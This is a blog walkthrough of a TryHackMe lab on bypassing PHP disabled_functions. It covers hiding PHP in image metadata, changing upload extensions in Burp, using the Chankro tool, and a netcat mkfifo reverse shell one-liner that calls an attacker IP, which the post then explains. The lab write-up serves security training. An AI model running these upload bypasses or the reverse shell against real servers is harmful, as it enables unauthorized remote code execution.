---
title: 'TryHackMe - Bypass Disable Functions'
description: "How to get around PHP disabled_functions utilizing Local File Injection (LFI) and a bit on named pipes and reverse shells."
author: 'Tim Sonner'
date: '2023-09-26'
hero: '/thm-bdf/thm-bdf-hero.jpg'
published: true
---
![](/thm-bdf/thm-bdf-hero.jpg)

> Picture of an European common cat using Tamron AF 70-300mm F4-5.6 Di LD Macro 1:2 lens
> Date 	18 December 2010
> Source 	Own work
> Author 	Florinux  
> http://www.wikimapia.org/#lat=44.647834&lon=7.6567841&z=14&l=4&m=b  


# THM - Bypass Disable Functions  
https://tryhackme.com/room/bypassdisablefunctions  

## First spin up the target machine and navigate to the upload CV page  

We're going to upload an image with a PHP payload. Its benign and will help us gain info about the target system. I searched the interweb for a cat image, I saved it with the .jpg extension.  

## Generate phpinfo() payload using exiftool to inject PHP into an image's Meta Data  
```  
exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg  
```  

## Browse for the image file using the CV upload form. Before submitting, make sure you have Burp Suite setup to intercept requests to the target. Toggle Intercept On and submit the image.  

![](/thm-bdf/thm-bdf-upload.png)

## Modify teh POST request to change image file extension from .jpg to .php  
![](/thm-bdf/thm-bdf-burp.png)

## Navigate to /uploads/street-cat.php  
For later payloads, we can use curl...  
```  
curl https://x.x.x.x/uploads/tryhackme.php
```  

## We are presented with phpinfo()  
![](/thm-bdf/thm-bdf-phpinfo.png)  

Take a look at the disabled_functions and DOCUMENT_ROOT. The disabled_functions tell us we can't use many PHP functions. We must resort to using other means. 

## Download and install Chankro  
https://github.com/TarlogicSecurity/Chankro/tree/master

## Generate bash payload (c.sh) using your favorite flavor of text editor or echo
```bash  
#! /bin/bash
find / flag*.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag-location.txt  
#cat /path/to/flag/flag.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag.txt
```  

## Excute chankro command using the path in CONTEXT_DOCUMENT_ROOT as an argument to generate a .php file (don't forget /uploads/)
```  
python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/  
```  
## Add the magic gif word (GIF87a) to the top of the php file. 1 is line number, i is insert  
```  
sed -i '1iGIF87a' tryhackme.php
```  
## Rename the .php file extension to .jpg  
```  
mv tryhackme.php tryhackme.jpg
```  
## Upload the file using BurpSuite to rename the extension .php  
![](/thm-bdf/thm-bdf-burp-2.png)

## Navigate to /uploads/tryhackme.php  

Try a few payloads... Once the flag is captured, we need to spin up a reverse shell for the sake of learning.  

## Generate a reverse shell payload  
https://revshells.com  
The nc mkfifo payload is ver nice.  Change the IP to your attacker machine IP. Run 'ip addr' and look for tun0 or tun1

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```  

## Setup the netcat listener on localhost    
```  
nc -nvlp 9001
```  

## Navigate to or curl /uploads/tryhackme.php  
![](/thm-bdf/thm-bdf-nc-mkfifo-shell.png)  

I tried a few variations before settling on the nc mkinfo method. Some results of my testing show us the nature of what Chankro is doing behind the scenes. We obviously called the mail() PHP function to get our c.php to run. Kindof ingenious.  

## Bind shell  
![](/thm-bdf/thm-bdf-bind-shell.png)  

## Reverse Shell  
![](/thm-bdf/thm-bdf-rev-shell.png)


# Tangent about Reverse Shells and Named Pipes  
```  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```  

Here’s how it works:

1. ```rm /tmp/f;``` Deletes the file named “f” in the “/tmp” directory if it exists.
2. ```mkfifo /tmp/f;``` Creates a named pipe (FIFO) named “f” in the “/tmp” directory. This pipe acts as a stack for data between processes (First In First Out).
3. ```cat /tmp/f|``` Reads from the named pipe “f.” It effectively listens for any data written into the pipe and sends any data it reads to the standard input (stdin) of the interactive shell.
4. ```sh -i 2>&1|``` Starts an interactive shell (“sh”) and redirects stderr to the same location stdout is using. This location is not the named pipe “f” but is, in fact, standard output of the shell. The shell output (stdout/stderr) is sent to the standard input (stdin) of nc.
5. ```nc 10.10.10.10 9001``` Initiates a network connection to IP address 10.10.10.10 on port 9001.
6. ```>/tmp/f``` Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f.”

In teh Linux:  
• File descriptor 0 represents standard input (stdin).  
• File descriptor 1 represents standard output (stdout).  
• File descriptor 2 represents standard error (stderr).  

So, when you use ```2>&1```, it’s instructing the shell to redirect standard error (file descriptor 2) to wherever standard output (file descriptor 1) is currently directed.  

The ```>&``` syntax is used for redirecting one file descriptor to the location another file descriptor is using.  

When you run ```sh -i``` without any redirection, you will typically see the standard output (stdout) from the interactive shell session, but you won’t see standard error (stderr).  

Some commands return standard error (stderr) as output even when completed successfully, other commands actually return errors to standard error (stderr). wut?!  

Always check stderr in your code for success, sometimes its a good thing and not actually an error…  

Standard output and input are referred to as streams, we can choose where the streams flow.  

## Links I found along the way...  
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass  

https://www.positioniseverything.net/php-shell_exec/  

https://www.tarlogic.com/blog/bypass-disable_functions-open_basedir/  

https://shahjerry33.medium.com/remote-code-execution-via-exif-data-im-dangerous-43557d7f3e7a  

https://marketsplash.com/tutorials/php/php-reverse-shell/  

https://github.com/pentestmonkey/php-reverse-shell  

https://www.geeksforgeeks.org/uploading-a-reverse-shell-to-a-web-server-in-kali-linux/  

https://highon.coffee/blog/reverse-shell-cheat-sheet/  

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  

https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/